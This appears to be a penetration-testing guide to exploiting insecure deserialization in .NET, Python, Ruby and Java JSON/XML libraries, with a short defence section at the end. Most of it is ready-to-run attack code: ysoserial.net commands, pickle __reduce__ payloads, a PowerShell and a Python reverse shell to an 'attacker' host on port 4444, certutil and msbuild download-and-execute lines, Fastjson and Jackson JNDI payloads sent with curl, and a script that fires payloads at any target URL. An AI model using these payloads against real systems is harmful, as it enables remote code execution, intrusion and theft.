# Cross-Platform Deserialization Guide

> Comprehensive guide covering deserialization exploitation across .NET (ysoserial.net), Python (pickle), Ruby (Marshal), and JSON/XML deserialization formats, with detection methodology and defensive strategies.

## Introduction and Objectives

While Java and PHP deserialization receive the most attention, insecure deserialization vulnerabilities affect virtually every programming platform. This guide covers exploitation techniques for .NET, Python, Ruby, and structured data formats (JSON/XML) where type information enables object injection attacks.

This guide covers:

- .NET deserialization via ysoserial.net (ViewState, BinaryFormatter, LosFormatter)
- Python pickle exploitation (Flask sessions, Django sessions, IPC channels)
- Ruby Marshal and YAML deserialization (Rails, ERB, Gem chains)
- JSON/XML polymorphic deserialization (Jackson, Fastjson, XStream)
- Cross-platform detection methodology
- Defense and prevention strategies for all platforms

### Prerequisites

- ysoserial.net downloaded for .NET exploitation
- Python 3.x with standard library for pickle payloads
- Ruby runtime for Marshal/YAML payload generation
- Understanding of each platform's serialization mechanisms
- Callback infrastructure (Burp Collaborator, interactsh) for blind detection

## 1. .NET Deserialization with ysoserial.net

### Understanding .NET Serialization Formats

.NET supports multiple serialization formats, each with different exploitation paths:

```bash
# .NET serialization format identification:
# BinaryFormatter: Base64 starting with "AAQAA" or binary starting with 0x00 0x01
# LosFormatter: Used for ViewState; Base64 encoded
# NetDataContractSerializer: WCF-specific; includes CLR type information
# DataContractSerializer: WCF with known types
# SoapFormatter: XML-based .NET serialization

# Identify ViewState in ASP.NET application
curl -s http://target/default.aspx | grep -o '__VIEWSTATE[^"]*"[^"]*"'
# Extract ViewState value for analysis

# Decode ViewState (before .NET 4.5 with MAC disabled)
echo "VIEWSTATE_VALUE" | base64 -d | xxd | head -10

# Identify .NET version from response headers
curl -sI http://target/ | grep -i "x-aspnet"
# X-AspNet-Version: 4.0.30319
```

### ViewState Exploitation

ASP.NET ViewState is the most common .NET deserialization attack vector. ViewState data is serialized using `LosFormatter` and can contain arbitrary .NET objects when MAC validation is disabled or machineKey is known.

```bash
# Basic ViewState payload (no MAC)
ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c whoami" --base64

# ViewState with known machineKey
# machineKey format: validationKey,decryptionKey (hex strings)
ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c whoami" \
  --base64 \
  --machinekey "EB0A773F50F56D5B3808F3C64726F28E8EC9B4F1C50B341D65710A3B0B1F2F17A5C8F6E3C4898F67B8B7E3B41E2D7080C40B9B40E0E1A7F1B2A5F78D2A5A5A6,8FE53F3B52FF42A7C9C7B1A6C08F3C5BAA7D5C11DD4B1B1A7F1B2A5F78D2A5A5A6" \
  --path="/default.aspx"

# ViewState with specific validation and decryption algorithms
ysoserial.net -g TypeConfuseDelegate -f LosFormatter -c "cmd /c echo pwned > C:\pwned.txt" \
  --base64 \
  --machinekey "VALID_KEY,DECRYPT_KEY" \
  --validation SHA1 \
  --decryption AES

# ViewState targeting specific page
ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c calc.exe" \
  --base64 \
  --machinekey "KEYS_HERE" \
  --path="/admin/dashboard.aspx" \
  --target=ViewState

# Legacy ViewState (no MAC validation at all)
ysoserial.net -g ActivitySurrogateSelector -f LosFormatter -c "cmd /c whoami" \
  --base64 \
  --islegacy
```

### BinaryFormatter Direct Exploitation

```bash
# BinaryFormatter payloads for APIs and services that accept binary data
ysoserial.net -g ObjectDataProvider -f BinaryFormatter -c "cmd /c whoami" --base64

# TypeConfuseDelegate (smaller payload, higher reliability)
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" --base64

# TextFormattingRunProperties (works with Visual Studio extensions)
ysoserial.net -g TextFormattingRunProperties -f BinaryFormatter \
  -c "cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker/ps.ps1')" \
  --base64

# WindowsIdentity (requires System.IdentityModel.dll)
ysoserial.net -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami" --base64

# ActivitySurrogateSelector (requires specific .NET version)
ysoserial.net -g ActivitySurrogateSelector -f BinaryFormatter -c "cmd /c calc.exe" --base64

# ObjectStateFormatter for hidden fields
ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter -c "cmd /c whoami" --base64

# NetDataContractSerializer (WCF services)
ysoserial.net -g ObjectDataProvider -f NetDataContractSerializer -c "cmd /c whoami" --base64
```

### .NET Reverse Shell Techniques

```bash
# PowerShell reverse shell encoded command
# Step 1: Generate PowerShell reverse shell
ps_shell='$c=New-Object System.Net.Sockets.TcpClient("attacker",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)};$c.Close()'

# Step 2: Base64 encode with UTF-16LE
echo -n "$ps_shell" | iconv -t UTF-16LE | base64 -w0

# Step 3: Generate ysoserial.net payload with encoded command
ysoserial.net -g TypeConfuseDelegate -f LosFormatter \
  -c "powershell -enc BASE64_ENCODED_SHELL" --base64

# Download and execute method (more reliable for complex payloads)
ysoserial.net -g ObjectDataProvider -f BinaryFormatter \
  -c "cmd /c certutil -urlcache -split -f http://attacker/payload.exe C:\\temp\\p.exe && C:\\temp\\p.exe" \
  --base64

# MSBuild inline task execution
ysoserial.net -g ObjectDataProvider -f LosFormatter \
  -c "cmd /c msbuild http://attacker/evil.xml" --base64
```

## 2. Python Pickle Deserialization

### Understanding Python Pickle

Python's `pickle` module serializes objects into a bytecode format. During deserialization, pickle executes opcodes that can instantiate arbitrary classes and call arbitrary functions via the `__reduce__` method.

```bash
# Basic pickle serialization
python3 -c "
import pickle
data = {'user': 'admin', 'role': 'superuser'}
print(pickle.dumps(data))
"

# Pickle protocol versions (0-5)
# Protocol 0: ASCII (human-readable)
# Protocol 1-2: Binary (older Python)
# Protocol 3-4: Binary (Python 3.x)
# Protocol 5: Python 3.8+ (out-of-band data)

# Basic __reduce__ exploitation
python3 -c "
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print('Payload (raw):', payload)
print('Payload (base64):', base64.b64encode(payload).decode())
"
```

### Flask Session Deserialization

```bash
# Flask uses itsdangerous for session serialization
# Older Flask versions (< 1.0) used pickle as the default serializer

# Identify Flask session cookie format
# Flask sessions are: timestamp.payload.signature (dot-separated, Base64)
# The payload portion is pickle-serialized in older versions

# Crack Flask secret key with flask-unsign
pip install flask-unsign
flask-unsign --unsign --cookie 'eyJ...' --wordlist /usr/share/wordlists/rockyou.txt

# Forge Flask session with pickle payload
python3 -c "
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker/flask-rce',))

payload = pickle.dumps(RCE())
# In older Flask, sign this with known SECRET_KEY
# flask-unsign --sign --cookie 'PICKLE_BASE64' --secret 'KEY'
print(base64.b64encode(payload).decode())
"

# Modern Flask (>= 1.0) uses JSON serializer by default
# Check if Flask app explicitly uses PickleSerializer:
# app.session_interface.serializer = pickle
# If so, exploitation is possible even with modern Flask
```

### Django Session Deserialization

```bash
# Django signed_cookies session backend uses pickle in older versions
# Check Django settings: SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'

# Forge Django session with known SECRET_KEY
python3 -c "
import os
os.environ['DJANGO_SETTINGS_MODULE'] = 'settings'

import django
django.setup()

from django.core import signing
import pickle, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker/django-rce',))

# Django signed cookie format
SECRET_KEY = 'known_secret_key'
payload = signing.dumps(RCE(), key=SECRET_KEY, serializer=signing.PickleSerializer)
print(payload)
"

# Django YAML deserialization (if using PyYAML with unsafe load)
python3 -c "
import yaml, base64

# Unsafe YAML payload exploiting python/object/apply
payload = '''!!python/object/apply:os.system ['curl http://attacker/yaml-rce']'''
print(base64.b64encode(payload.encode()).decode())
"

# Django celery task deserialization
# If celery uses pickle serializer (CELERY_TASK_SERIALIZER = 'pickle')
python3 -c "
import pickle, base64, os

class CeleryRCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(CeleryRCE())
print('Celery pickle payload:', base64.b64encode(payload).decode())
"
```

### Advanced Python Pickle Techniques

```bash
# Eval-based payload for complex operations
python3 -c "
import pickle, base64

class EvalRCE:
    def __reduce__(self):
        return (eval, (\"__import__('os').system('id')\",))

print(base64.b64encode(pickle.dumps(EvalRCE())).decode())
"

# Exec-based multi-statement payload
python3 -c "
import pickle, base64

class ExecRCE:
    def __reduce__(self):
        code = '''
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker', 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(['/bin/sh', '-i'])
'''
        return (exec, (code,))

print(base64.b64encode(pickle.dumps(ExecRCE())).decode())
"

# Subprocess-based payload for better output handling
python3 -c "
import pickle, base64, subprocess

class SubprocessRCE:
    def __reduce__(self):
        return (subprocess.check_output, (['curl', 'http://attacker/$(whoami)'],))

print(base64.b64encode(pickle.dumps(SubprocessRCE())).decode())
"

# RestrictedUnpickler bypass attempts
# If target uses RestrictedUnpickler with incomplete blacklist
python3 -c "
import pickle, base64

class Bypass:
    def __reduce__(self):
        # Try alternative function references
        return (eval, (\"__import__('subprocess').check_output(['id'])\",))

print(base64.b64encode(pickle.dumps(Bypass())).decode())
"
```

## 3. Ruby Deserialization

### Ruby Marshal and YAML Exploitation

Ruby's `Marshal.load` and `YAML.load` (unsafe) can deserialize arbitrary Ruby objects, triggering exploitation through magic methods like `init_with` and Ruby's extensive standard library.

```bash
# Ruby Marshal format identification
# Marshal data starts with version bytes: 0x04 0x08
# Base64-encoded Marshal data common in Rails cookies

# Generate basic Marshal payload
ruby -e '
require "base64"

class Evil
  def initialize
    @cmd = "id"
  end
end

payload = Marshal.dump(Evil.new)
puts "Marshal payload: #{Base64.strict_encode64(payload)}"
'

# Ruby YAML.load unsafe deserialization
ruby -e '
require "yaml"

# Craft YAML payload exploiting ERB
payload = <<~YAML
---
!ruby/object:ERB
src: "system(\"id\")"
YAML

puts "YAML payload:"
puts payload
puts "Base64: #{Base64.strict_encode64(payload)}"
'

# Ruby Gem::RequestSet gadget chain (CVE-2022-32224)
ruby -e '
require "yaml"

payload = <<~YAML
---
!ruby/object:Gem::Installer
i: x
YAML

puts "Gem gadget payload generated"
'
```

### Rails Cookie Deserialization

```bash
# Rails 4.x/5.x uses Marshal for cookie serialization
# With known secret_key_base, forge malicious cookies

# Derive Rails secret key from secret_key_base
ruby -e '
require "openssl"
require "base64"

secret_key_base = "known_secret_key_base"
# Rails key derivation for cookie signing
key = OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret_key_base, "authenticated encrypted cookie", 1000, 32)
puts "Derived signing key: #{Base64.strict_encode64(key)}"
'

# Full Rails cookie forgery workflow
# Step 1: Obtain secret_key_base from:
#   - /rails/info/properties (development mode)
#   - Source code leak (.env, config/secrets.yml)
#   - Server error pages revealing environment variables
#   - Known default keys for specific frameworks

# Step 2: Use rails-cookie-decryptor to forge cookie
git clone https://github.com/AdrianCX/rails-cookie-decryptor
cd rails-cookie-decryptor
ruby decryptor.rb -c "EXISTING_COOKIE" -s "secret_key_base"

# Step 3: Forge cookie with Marshal payload
ruby -e '
require "active_support/message_verifier"
require "base64"

secret = "secret_key_base_here"
verifier = ActiveSupport::MessageVerifier.new(secret)

# Marshal payload that triggers RCE
class Evil
  def marshal_dump
    "system(\"id\")"
  end
end

# Forge signed cookie
# signed_cookie = verifier.generate(Evil.new)
puts "Forge cookie using verifier with known secret"
'
```

## 4. JSON/XML Deserialization Exploitation

### Jackson Polymorphic Deserialization

```bash
# Jackson with DEFAULT_TYPING enabled allows class injection via @class
# Identify Jackson DEFAULT_TYPING by sending malformed JSON type hints

# Test for DEFAULT_TYPING with URL probe
curl -X POST http://target/api/endpoint \
  -H 'Content-Type: application/json' \
  -d '["java.net.URL","http://attacker/jackson-probe"]'
# Monitor HTTP callback server for request

# JdbcRowSetImpl JNDI injection via Jackson
curl -X POST http://target/api/endpoint \
  -H 'Content-Type: application/json' \
  -d '["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}]'

# Spring ClassPathXmlApplicationContext loading
curl -X POST http://target/api/endpoint \
  -H 'Content-Type: application/json' \
  -d '["org.springframework.context.support.ClassPathXmlApplicationContext","http://attacker/beans.xml"]'

# Hibernate TypedValue chain via Jackson
curl -X POST http://target/api/endpoint \
  -H 'Content-Type: application/json' \
  -d '["org.hibernate.engine.spi.TypedValue",{"value":"test","type":{"@class":"org.hibernate.type.ComponentType"}}]'
```

### Fastjson Exploitation

```bash
# Fastjson < 1.2.24: autotype enabled by default
curl -X POST http://target/api \
  -H 'Content-Type: application/json' \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}'

# Fastjson 1.2.24-1.2.47: cache bypass via java.lang.Class
curl -X POST http://target/api \
  -H 'Content-Type: application/json' \
  -d '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}}'

# Fastjson 1.2.48-1.2.68: expectClass bypass
curl -X POST http://target/api \
  -H 'Content-Type: application/json' \
  -d '{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.XmlStreamReader","inputStream":{"@type":"org.apache.commons.io.input.ReaderInputStream"},"reader":{"@type":"java.io.InputStreamReader"}}'

# Fastjson DNS probe (safe detection without RCE)
curl -X POST http://target/api \
  -H 'Content-Type: application/json' \
  -d '{"@type":"java.net.Inet4Address","val":"attacker.com"}'
```

### XStream XML Deserialization

```bash
# XStream ProcessBuilder RCE
curl -X POST http://target/api \
  -H 'Content-Type: application/xml' \
  -d '<java.util.ProcessBuilder><command><string>cmd</string><string>/c</string><string>whoami</string></command></java.util.ProcessBuilder>'

# XStream EventHandler proxy
curl -X POST http://target/api \
  -H 'Content-Type: application/xml' \
  -d '<dynamic-proxy><interface>java.lang.Runnable</interface><handler class="java.beans.EventHandler"><target class="java.lang.ProcessBuilder"><command><string>cmd</string><string>/c</string><string>calc</string></command></target><action>start</action></handler></dynamic-proxy>'

# XStream ImageIO trigger (CVE-2021-39154)
curl -X POST http://target/api \
  -H 'Content-Type: application/xml' \
  -d '<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value>test</value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value>test</value></jdk.nashorn.internal.objects.NativeString></entry></map>'

# XStream CVE-2021-39141 (SQLException)
curl -X POST http://target/api \
  -H 'Content-Type: application/xml' \
  -d '<java.sql.ResultSet><hydrate class="java.lang.ProcessBuilder"><command><string>id</string></command></hydrate></java.sql.ResultSet>'
```

## 5. Cross-Platform Detection Methodology

### Universal Detection Techniques

```bash
# Technique 1: Magic byte fingerprinting
# Java: 0xACED0005 (or Base64: rO0AB)
# .NET: 0x00 0x01 0x00 0x00 0x00 (or Base64: AAQAA)
# PHP: O:<digits>:"<classname>"
# Python pickle: \x80 (protocol byte) followed by version
# Ruby Marshal: \x04\x08

# Scan for serialization magic bytes in HTTP traffic
# Using Burp Suite: Search for patterns in Proxy history
# Python pickle: starts with gASV or \x80\x04 or \x80\x05

# Technique 2: Error message analysis
# Java: "java.io.InvalidClassException", "ClassNotFoundException"
# PHP: "Class 'X' not found", "unserialize() expects parameter"
# .NET: "Unable to find assembly", "BinaryFormatter"
# Python: "No module named", "AttributeError", "Can't get attribute"

# Technique 3: Time-based detection (works for all platforms)
# Send payload with 5-10 second delay command and measure response time

# Technique 4: OOB callback detection
# DNS: nslookup / dig / host (cross-platform)
# HTTP: curl / wget / file_get_contents / WebClient
```

### Automated Detection Script

```bash
# Cross-platform deserialization detection script
#!/bin/bash
TARGET_URL="$1"
PARAMETER="$2"
CALLBACK="attacker.burpcollaborator.net"

echo "[*] Testing for Java deserialization..."
JAVA_PAYLOAD=$(java -jar ysoserial.jar CommonsCollections5 "nslookup java.${CALLBACK}" 2>/dev/null | base64 -w0)
curl -s -o /dev/null -w "Java HTTP: %{http_code}\n" "${TARGET_URL}?${PARAMETER}=${JAVA_PAYLOAD}"

echo "[*] Testing for PHP deserialization..."
PHP_PAYLOAD=$(phpggc -b Laravel/RCE1 "file_get_contents('http://php.${CALLBACK}/test')" 2>/dev/null)
curl -s -o /dev/null -w "PHP HTTP: %{http_code}\n" "${TARGET_URL}?${PARAMETER}=${PHP_PAYLOAD}"

echo "[*] Testing for .NET deserialization..."
DOTNET_PAYLOAD=$(ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c nslookup dotnet.${CALLBACK}" --base64 2>/dev/null)
curl -s -o /dev/null -w ".NET HTTP: %{http_code}\n" "${TARGET_URL}?${PARAMETER}=${DOTNET_PAYLOAD}"

echo "[*] Testing for Python pickle deserialization..."
PYTHON_PAYLOAD=$(python3 -c "
import pickle, base64, os
class P: __reduce__ = lambda s: (os.system, ('nslookup python.${CALLBACK}',))
print(base64.b64encode(pickle.dumps(P())).decode())
" 2>/dev/null)
curl -s -o /dev/null -w "Python HTTP: %{http_code}\n" "${TARGET_URL}?${PARAMETER}=${PYTHON_PAYLOAD}"

echo "[*] Check callback server for DNS/HTTP requests from target"
echo "[*] Match callback subdomain to identify vulnerable platform"
```

## 6. Defense and Prevention

### Platform-Specific Defenses

```bash
# === Java Defenses ===
# 1. Override ObjectInputStream.resolveClass() with whitelist
# 2. Use ObjectInputFilter (Java 9+)
# 3. Deploy Java agent RASP (Contrast, OpenRASP)
# 4. Replace native serialization with JSON/Protobuf

# === .NET Defenses ===
# 1. Set enableViewStateMac="true" in web.config
# 2. Use ASP.NET Core Data Protection API instead of MachineKey
# 3. Set ViewStateEncryptionMode="Always"
# 4. Migrate from BinaryFormatter to System.Text.Json

# === PHP Defenses ===
# 1. Never call unserialize() on user input
# 2. Use json_decode() instead
# 3. If unserialize() is required, use allowed_classes whitelist:
#    unserialize($data, ['allowed_classes' => ['SafeClass1', 'SafeClass2']])
# 4. Disable phar:// wrapper if not needed

# === Python Defenses ===
# 1. Never use pickle on untrusted data
# 2. Use RestrictedUnpickler with class whitelist:
class SafeUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module not in ALLOWED_MODULES:
            raise pickle.UnpicklingError(f"Blocked: {module}.{name}")
        return super().find_class(module, name)
# 3. Use JSON for data interchange
# 4. Flask: use JSON serializer (default in >= 1.0)

# === Ruby Defenses ===
# 1. Never use Marshal.load on user data
# 2. Use JSON.parse with permitted classes
# 3. Rails: use JSON session serializer instead of Marshal
# 4. YAML: always use safe_load() instead of load()
```

## Hands-on Exercise

### Lab: Multi-Platform Deserialization Detection

```bash
# Set up a vulnerable test environment with multiple platforms

# Terminal 1: Start callback server
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'Callback received: {self.path}')
        self.send_response(200)
        self.end_headers()
HTTPServer(('0.0.0.0', 8000), H).serve_forever()
"

# Terminal 2: Generate payloads for all platforms
# Java payload
java -jar ysoserial.jar CommonsCollections5 'curl http://localhost:8000/java-callback' | base64 -w0

# PHP payload
php phpggc -b Monolog/RCE1 'file_get_contents("http://localhost:8000/php-callback")'

# .NET payload
ysoserial.net -g ObjectDataProvider -f LosFormatter -c "cmd /c curl http://localhost:8000/dotnet-callback" --base64

# Python payload
python3 -c "
import pickle, base64
class P:
    def __reduce__(self):
        import urllib.request
        return (urllib.request.urlopen, ('http://localhost:8000/python-callback',))
print(base64.b64encode(pickle.dumps(P())).decode())
"

# Terminal 3: Send payloads to target and observe callbacks
# Match the callback path to identify which platform is vulnerable
```

## References and Resources

- **ysoserial.net GitHub**: https://github.com/pwntester/ysoserial.net -- Official .NET deserialization tool
- **Python pickle Documentation**: https://docs.python.org/3/library/pickle.html -- Official pickle docs with security warnings
- **Ruby Marshal Documentation**: https://ruby-doc.org/core/Marshal.html -- Ruby Marshal format reference
- **Jackson Deserialization CVEs**: https://github.com/FasterXML/jackson-databind/issues -- Jackson vulnerability tracker
- **Fastjson Vulnerabilities**: https://github.com/alibaba/fastjson/wiki/security_update_en -- Fastjson security advisories
- **XStream Security Advisories**: https://x-stream.github.io/security.html -- XStream CVE tracking
- **OWASP Deserialization Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html -- Cross-platform defense guide
- **PortSwigger Deserialization Labs**: https://portswigger.net/web-security/deserialization -- Interactive practice labs
- **NCC Group Deserialization Research**: https://research.nccgroup.com/ -- Whitepapers on deserialization across platforms
- **Muellerberndt Cert/Paper**: https://github.com/NickstaDB/ -- .NET deserialization research and tools
- **flake-scanner**: https://github.com/flake-org/flake -- Python deserialization scanner
- **Rails Security Guide**: https://guides.rubyonrails.org/security.html -- Ruby on Rails security best practices including session serialization
